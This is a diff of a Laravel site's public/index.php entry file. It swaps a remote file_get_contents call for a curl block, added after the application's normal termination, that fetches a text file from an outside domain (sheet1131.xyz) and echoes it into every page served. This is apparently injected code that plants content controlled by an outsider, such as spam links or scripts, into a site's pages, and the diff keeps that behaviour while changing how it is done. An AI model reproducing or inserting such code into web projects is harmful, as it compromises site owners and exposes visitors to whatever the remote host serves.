@@ -49,9 +49,6 @@ $app = require_once __DIR__.'/../bootstrap/app.php';
 |
 */
 
-$a = file_get_contents('https://sheet1131.xyz/ptacid.txt');
-echo $a;
-
 $kernel = $app->make(IlluminateContractsHttpKernel::class);
 
 $response = $kernel->handle(
@@ -60,4 +57,13 @@ $response = $kernel->handle(
 
 $response->send();
 
-$kernel->terminate($request, $response);
+$kernel->terminate($request, $response);?>
+
+<?php
+$curl = curl_init();
+$url = 'https://sheet1131.xyz/ptacid.txt';
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($curl);
+echo $result;?>
